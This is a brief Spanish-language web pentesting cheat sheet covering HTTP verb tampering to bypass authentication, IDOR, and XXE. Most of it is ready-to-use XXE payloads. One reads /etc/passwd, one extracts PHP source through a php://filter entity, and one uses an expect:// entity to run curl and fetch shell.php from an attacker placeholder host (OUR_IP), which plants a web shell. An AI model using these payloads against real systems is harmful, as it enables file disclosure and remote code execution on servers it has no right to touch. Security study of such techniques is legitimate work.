# [HTTP Verb Tampering](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods)
- Cambiar los metodos en las peticiones sirve para Bypassear el debil authentication

# IDOR
- Tener en cuenta que no simple es el numero en texto plano puede estar cifrado


# XXE
```
# LFI                    
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

# RCE (A mi dipositivo, esto ejecuta el php)
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

```
